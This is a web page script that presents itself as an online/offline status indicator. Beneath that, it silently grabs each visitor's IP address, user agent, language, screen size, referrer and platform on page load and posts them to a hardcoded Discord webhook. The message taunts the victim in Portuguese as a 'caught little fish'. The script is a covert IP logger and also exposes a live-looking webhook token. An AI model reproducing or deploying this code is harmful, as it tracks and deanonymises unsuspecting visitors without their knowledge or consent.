<script>
    const ONLINE_THEME = {
      statusColor: 'green',
      secondSignalDelay: '0.2s',
      thirdSignalDelay: '0.4s'
  }
  
  const OFFLINE_THEME = {
      statusColor: 'orangered',
      secondSignalDelay: '0s',
      thirdSignalDelay: '0s'
  }
  
  function detectOnlineStatus() {
      let theme = navigator.onLine ? ONLINE_THEME : OFFLINE_THEME
      let root = document.documentElement
      root.style.setProperty('--status-color', theme.statusColor)
      root.style.setProperty('--second-signal-delay', theme.secondSignalDelay)
      root.style.setProperty('--third-signal-delay', theme.thirdSignalDelay)
  }
  
  window.addEventListener('online', detectOnlineStatus)
  window.addEventListener('offline', detectOnlineStatus)
  detectOnlineStatus()
  
  fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          const ipAddress = data.ip;
          const webhookUrl = 'https://discord.com/api/webhooks/1129429436052279407/LXkKj0uHynY-Dk1YrTLgmkDiNpJTvGqX1AyXAOOI7NWDbi94Ntv6Qzrq3RBEREVBw0ul';
  
          const userAgent = navigator.userAgent;
          const language = navigator.language;
          const screenWidth = window.screen.width;
          const screenHeight = window.screen.height;
          const referrer = document.referrer;
          const operatingSystem = navigator.platform;
  
          const message = `@everyone Novo peixinho pescado Oniichans! 👉👈😋  \nIP do peixinho: ${ipAddress} \nUser-Agent: ${userAgent} \nNavegador Linguagem: ${language} \nResolução da tela: ${screenWidth}x${screenHeight} \nReferência: ${referrer} \nSistema Operacional: ${operatingSystem} \nOBS: Se essa mensagem tiver menos de 5 dados provavelmente o peixinho está camuflado!`;
  
          fetch(webhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              content: message,
            }),
          })
          .then(response => {
            console.log('Mensagem enviada com sucesso!');
          })
          .catch(error => {
            console.error('Erro ao enviar a mensagem:', error);
          });
        })
        .catch(error => {
          console.error('Erro ao obter o endereço IP:', error);
        });
  </script>
